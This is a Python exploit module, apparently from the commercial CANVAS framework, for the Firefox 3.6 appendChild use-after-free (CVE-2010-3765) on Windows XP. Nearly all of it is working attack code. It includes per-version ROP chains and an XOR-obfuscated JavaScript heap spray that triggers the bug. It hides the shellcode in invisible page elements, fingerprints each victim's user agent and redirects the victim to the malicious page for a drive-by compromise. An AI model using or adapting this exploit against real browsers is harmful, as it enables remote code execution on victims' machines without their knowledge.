#!/usr/bin/env python
##ImmunityHeader v1 
###############################################################################
## File       :  firefox_appendchild.py
## Description:  
##            :  
## Created_On :  Tue Oct 26 15:00:00 2010
## Created_By :  Franco Riccobaldi
## Modified_On:  Tue Oct 29 15:00:00 2010
## Modified_By:  Franco Riccobaldi
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################

import sys
if '.' not in sys.path: sys.path.append('.')

import struct
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator

NAME='firefox_appendchild'
DESCRIPTION='Mozilla Firefox Use-After-Free'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Mozilla'
DOCUMENTATION['Date public']='10/26/2010'
DOCUMENTATION['References']=['https://bugzilla.mozilla.org/show_bug.cgi?id=607222']
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['VersionsAffected']='Firefox <=3.6.11'
DOCUMENTATION['CVE Name'] = 'CVE-2010-3765'
DOCUMENTATION['Notes'] = """Interleaving document.write and appendChild can lead to duplicate text
frames and overrunning of text run buffers.

This exploit can only be used from clientd.

Tested on:
Windows XP SP3 ENG with Firefox 3.6.11.


JavaScript Obfuscated.

We do not currently do process recovery in this exploit.

"""

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP'] #Not tested on anything but a XP for the moment
PROPERTY['DELIVERY']='HTTP'

NOTES="""
Use after free occurs here, [ESI] points to vTable.

Dereference and call:
1010B2EA   8B06             MOV EAX,DWORD PTR DS:[ESI]
1010B2EC   8B80 08010000    MOV EAX,DWORD PTR DS:[EAX+108]
1010B2F2   3D 60191210      CMP EAX,xul.10121960
1010B2F7   53               PUSH EBX
1010B2F8   8BD9             MOV EBX,ECX
1010B2FA   75 31            JNZ SHORT xul.1010B32D
........
10359592   FFD0             CALL EAX

The heap spray will fill memory with stack swapping ROP:
1017F7E7   BC 8891740D      MOV ESP,0D749188
1017F7EC   33F6             XOR ESI,ESI
1017F7EE   8937             MOV DWORD PTR DS:[EDI],ESI
1017F7F0   B8 02400080      MOV EAX,80004002
1017F7F5   5E               POP ESI
1017F7F6   C2 0400          RETN 4

ROP will copy shellcode to RWE page until 0xFFFFFFFF (end of shellcode) and execute.
"""

CHANGELOG="""
"""

#VERSION, STACK SWAPPING, RET, ROP.
targets={
    0:['Firefox/3.6.11','uf7e7u1017','u4bc8u1000','u4bc8u1000u4bc8u1000u4bc8u1000u4bc8u1000u4bc8u1000u4bc8u1000u4bc7u1000u0011u0000u827fu1000u0300u7FFEucda3u1000u6689u1000uB333uDEADuFFFFuFFFFu57A8u0d78u0000u0000u57A0u0d78u1000u0000u0040u0000u4bc7u1000u0001u0000u4bc7u1000u0000u0000u11a1u1000u4141u0FEBu3500u1007u25dfu1000u25dfu1000u25dfu1000u25dfu1000u11a1u1000u5B58u1889u3500u1007u25dfu1000u25dfu1000u25dfu1000u25dfu1000u11a1u1000uFB83u74FFu3500u1007u25dfu1000u25dfu1000u25dfu1000u25dfu1000u11a1u1000u830Bu04C0u3500u1007u25dfu1000u25dfu1000u25dfu1000u25dfu1000u11a1u1000uF3EBuE890u3500u1007u25dfu1000u25dfu1000u25dfu1000u25dfu1000u11a1u1000uFFECuFFFFu3500u1007u11a1u1000u57A8u0d78u827fu1000u57A8u0d78ucda3u1000'],
    1:['Firefox/3.6.10','u8247u1009','ub8b7u1029','uB8B7u1029uB8B7u1029uB8B7u1029uB8B7u1029uB8B7u1029uB8B7u1029u20F0u1011u0011u0000u1FC7u1052u0300u7FFEuFD6Du1001uA173u1007uB333uDEADuFFFFuFFFFu57A8u0d78u0000u0000u57A0u0d78u1000u0000u0040u0000u20F0u1011u0001u0000u20F0u1011u0000u0000u9405u1003u9090u0FEBuE541u1001u0583u1001u0583u1001u0583u1001u0583u1001u9405u1003u5B58u1889uE541u1001u0583u1001u0583u1001u0583u1001u0583u1001u9405u1003uFB83u74FFuE541u1001u0583u1001u0583u1001u0583u1001u0583u1001u9405u1003u830Bu04C0uE541u1001u0583u1001u0583u1001u0583u1001u0583u1001u9405u1003uF3EBuE890uE541u1001u0583u1001u0583u1001u0583u1001u0583u1001u9405u1003uFFECuFFFFuE541u1001u9405u1003u57A8u0d78u1FC7u1052u57A8u0d78uFD6Du1001'],
    2:['Firefox/3.6.9','uab07u1006','uef52u100a','uef52u100auef52u100auef52u100auef52u100auef52u100auef52u100auef51u100au0011u0000u5500u1001u0300u7FFEud761u1004uff9cu1007uB333uDEADuFFFFuFFFFu57A8u0d78u0000u0000u57A0u0d78u1000u0000u0040u0000uef51u100au0001u0000uef51u100au0000u0000uce22u1003u9090u0FEBu9602u1001uc563u1000uc563u1000uc563u1000uc563u1000uce22u1003u5B58u1889u9602u1001uc563u1000uc563u1000uc563u1000uc563u1000uce22u1003uFB83u74FFu9602u1001uc563u1000uc563u1000uc563u1000uc563u1000uce22u1003u830Bu04C0u9602u1001uc563u1000uc563u1000uc563u1000uc563u1000uce22u1003uF3EBuE890u9602u1001uc563u1000uc563u1000uc563u1000uc563u1000uce22u1003uFFECuFFFFu9602u1001uce22u1003u57A8u0d78u5500u1001u57A8u0d78ud761u1004'],
    3:['Firefox/3.6.8','ub8a7u1029','u0d0du0d0d','ub8acu1029u0d00u0d0du0d00u102du1000u0d00u102du1000u102du1000u2853u1000u0011u0000u116cu1000u0300u7ffeub459u1002u6b99u1000ub333udeaduffffuffffu57a8u13e8u0000u0000u57a0u13e8u1000u0000u0040u0000u2853u1000u0001u0000u2853u1000u0000u0000u1af1u1000u9090u0febu7be4u1005u2a49u1000u2a49u1000u2a49u1000u2a49u1000u1af1u1000u5b58u1889u7be4u1005u2a49u1000u2a49u1000u2a49u1000u2a49u1000u1af1u1000ufb83u74ffu7be4u1005u2a49u1000u2a49u1000u2a49u1000u2a49u1000u1af1u1000u830bu04c0u7be4u1005u2a49u1000u2a49u1000u2a49u1000u2a49u1000u1af1u1000uf3ebue890u7be4u1005u2a49u1000u2a49u1000u2a49u1000u2a49u1000u1af1u1000uffecuffffu7be4u1005u1af1u1000u57a8u13e8u116cu1000u57a8u13e8ub459u1002'],
    }


import string,random

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version=0
        self.name=NAME
        self.filename=''.join([random.choice(string.uppercase) for x in range(8)])+'.html'
        # Set up our javascript obfuscator, this could be done in httpclientside class
        self.jsObfuscator=JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        self.plugin_info=None # we want clientd to give us a plugin dict
        self.nohttpmosdef = True #we don't have room for the large http mosdef shellcode...see maximum size in the
        #encoder notes.
        return

    # self.plugin_info comes from clientd in parse_plugin_data scrubbed format
    def is_vulnerable(self,info_dict):
        self.user_agent = info_dict.get('user_agent',"")
        if not self.isWindowsXP(info_dict):            
            self.log("%s: Unsure that this is Windows XP, which is the only OS we support currently"%self.name)
            return 0
        if 'Firefox' not in self.user_agent:
            self.log("%s: User Agent not Firefox - bailing out. %s"%(self.name, self.user_agent))
            return 0
        for t in targets.keys():
            target=targets[t]
            if target[0] in self.user_agent:
                self.log("%s: Vulnerable version found"%(self.name))
                return 70
        self.log("%s: Not supported version of Firefox"%(self.name))            
        return 0


    def makefile(self,request_header=None):
        # Select ROP based on User-Agent (sequence from wild sample)
        # Rop will copy shellcode to RWE page until 0xFFFFFFFF (end of shellcode)
                
        for t in targets.keys():
            target=targets[t]
            if target[0] in self.user_agent:
                stackswap = target[1]
                ret = target[2]                
                rop = target[3]
                self.log("%s: Using %s for stack swapping and %s for Ret slide"%(self.name, stackswap,ret))
        
        shellcode = urluencode(self.shellcode+'\xFF\xFF\xFF\xFF').replace("%","")
        
        filedata="""
        <body><div style="visibility:hidden;width:0px;height:0px">
        <div id=sun>ROP</div>
        <div id=suv>SHELLCODE</div>
        </div><body><script type="text/javascript">SCRIPT</script>
        """.replace("SHELLCODE",shellcode).replace("ROP",rop)

        script = """
        function de(su){
	        var i;var sun = "";
	        for (i = 0; i < su.length; i++){
		        sun += String.fromCharCode(parseInt(su[i], 16));
		        } 
	        return unescape(sun);
        }
        function code(beastk){
	        var nop = "";
	        var len = beastk.length;
	        for (i = 0; i < len;) {
		        nop = nop + "m" + beastk.substring(i, i + 5);
		        i = i + 5;
	        }
	        nop = nop.split("m").toString();
	        var temp = new Array();
	        for (j = 0; j < nop.length; j++) {
		        if (nop.charCodeAt(j).toString(16) == "2c") {
			        temp.push("25");
		        }
		        else {
			        temp.push(nop.charCodeAt(j).toString(16));
		        }
	        }
	        return de(temp);
        }
        function create_append(str){
	        var cobj=document.createElement(str);
	        document.body.appendChild(cobj);
            cobj.scrollWidth; // flush layout
	        return;
        }
        var bk="mp.ojsyex5";
        var array = new Array();
        var ls = 0x100000-(bk.length*2+0x01020);

        b1 = code('RET');
        var b = b1;
        while (b.length < (0x85750 - 0x1000) / 2) {
	        b += b1
        };

        var sun = document.getElementById("sun").innerHTML;
        var suv = document.getElementById("suv").innerHTML;

        b += code(sun + suv);
        for (u = 0; u < 8; u++) {
	        b1 += b1;
        }
        while (b.length < ls) {
	        b += b1;
        }
        var lh = b.substring(0, ls / 2);
        b = "";
        for (i = 0; i < 0x200; i++) {
	        array[i] = lh + bk;
        }

        b1=code('STACKSWAP');

        for (i = 0; i < 16; i++) {
	        b1 += b1;
        }
        b = b1;
        while (b.length < ls) {
	        b += b1;
        }
        lh = b.substring(0, ls / 2);
        b = "";
        for (i = 0x200; i < 0x500; i++) {
	        array[i] = lh + bk;
        }

        var tags = new Array("audio", "a", "base");
        for (inx = 0; inx < 0x3; inx++){
	        for (i = 0; i < tags.length; i++) {
		        create_append(tags[i]);
		        var html = "<" + tags[i] + " " + "textContent" + "=a></" + tags[i] + ">" + tags[i];
		        document.write(html);
                }
	}""".replace("STACKSWAP",stackswap).replace("RET",ret)

        filedata = filedata.replace('SCRIPT',self.jsObfuscator.obfuscate(script))
        self.debuglog("Built the exploit")
        return filedata

    def makesploit(self, clientheader, clientbody):
        from libs.spkproxy import header, body
        # header is used to store request and reponse headers
        header=header('SERVER')
        body=body()
        # Clientd gives us a lot of information about the remote endpoint
        if self.plugin_info:
            # Check if the remote endpoint is vulnerable to our exploit
            if self.is_vulnerable(self.plugin_info)==0:
                self.log('Bailing on this client as it is not likely to be vulnerable')
                #Return a 404 here?
                return None,None
        if clientheader.URL.count(self.filename):
            self.log('%s: Serving HTML file'%self.name)
            # Create the shellcode (self.shellcode)
            self.createShellcode()
            # Create the HTML Contents
            html=self.makefile(request_header=clientheader)
            if not html:
                self.log("%s: Error creating HTML for this exploit"%self.name)
                return None, None #done
            body.setBody(html)
            header.addHeader('Content-Type','text/html')
            header.addHeader('Set-Cookie','SessionID=%d'%(self.jsObfuscator.getXORKey()))
        else:
            self.log('%s: Redirecting to self'%self.name)
            header.status='302'
            header.addHeader('Location',self.filename)
            header.addHeader('Content-Type','text/html')
        return header,body

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()

    def getArgs(self):
        self.host=self.target.interface
        self.getarg('filename')
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        # Populate the needed arguments of the exploit
        self.getArgs()
        # Build the html that triggers the vulnerability
        filedata=self.makefile()
        self.log('Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.debuglog('Wrote to %s'%(self.filename),color='red')
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
